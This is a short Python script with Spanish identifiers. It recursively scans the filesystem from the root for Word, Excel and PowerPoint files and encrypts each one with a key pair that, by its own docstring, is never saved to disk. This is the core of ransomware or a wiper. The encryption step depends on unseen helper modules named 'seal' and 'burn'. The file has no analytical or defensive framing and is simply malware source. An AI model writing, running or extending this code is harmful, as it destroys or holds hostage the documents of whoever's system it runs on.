import os
import fnmatch

extensiones = ["pptx","xlsx","docx"]
origen = "/"
def encuentra_archivos()->list[str]:
    """
    Itereate through the system files in order to find files that have extensions of
    interest.
    The search for files is recursive, and the starting point is by default the root
    of the system.
    """
    archivos_encontrados = []
    for ruta_actual, directorios, archivos in os.walk(origen):
        for archivo in archivos:
            for extension in extensiones:
                if fnmatch.fnmatch(archivo, f'*.{extension}'):
                    archivos_encontrados.append(os.path.join(ruta_actual, archivo))
    return archivos_encontrados

def quick_encrypt():
    """
    Quickly iterates between files that match the given extensions and encrypts them,
    without ever saving the keys into the hard drive.
    The search for files is recursive, and the starting point is by default the root
    of the system.
    """
    import seal
    import burn 
    priv_key,pub_key=seal.volatile_key()
    for ruta_actual, directorios, archivos in os.walk(origen):
        for archivo in archivos:
            for extension in extensiones:
                if fnmatch.fnmatch(archivo, f'*.{extension}'):
                    burn.fast_encrypt(os.path.join(ruta_actual,archivo),pub_key)
